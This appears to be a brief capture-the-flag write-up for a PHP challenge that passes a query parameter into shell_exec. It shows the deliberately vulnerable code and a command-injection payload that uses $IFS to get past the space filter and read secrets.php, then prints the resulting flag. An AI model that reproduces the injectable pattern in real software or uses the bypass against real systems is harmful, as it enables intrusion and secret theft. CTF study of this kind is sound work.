When we access the site we see this:

```
<?php
require __DIR__ . '/secrets.php';
if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

$value = $_GET['secrets'];
if (strpos($value, ' ') !== false) {
  exit;
}

$cmd = "/usr/bin/find . ".$value;
echo shell_exec($cmd);


?>
```

We need to provide 2 query parameters `start` and `secrets` in order to byppass the conditions.
For secrets spaces are not permitted. We have to use `$IFS` (input field separator).
So we use this:

```
view-source:http://35.246.158.241:32219/?start=1&secrets=;cat$IFS$(ls)

.
./index.php
./secrets.php
<?php
require __DIR__ . '/secrets.php';
if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

$value = $_GET['secrets'];
if (strpos($value, ' ') !== false) {
  exit;
}

$cmd = "/usr/bin/find . ".$value;
echo shell_exec($cmd);


?>


<?php

function get_flag() {
    echo "CTF{3b2ceb0403300535fcd4808e8cbdb3cc3bd8f8b674527adce2915467f182faa4}";
}

?>


```
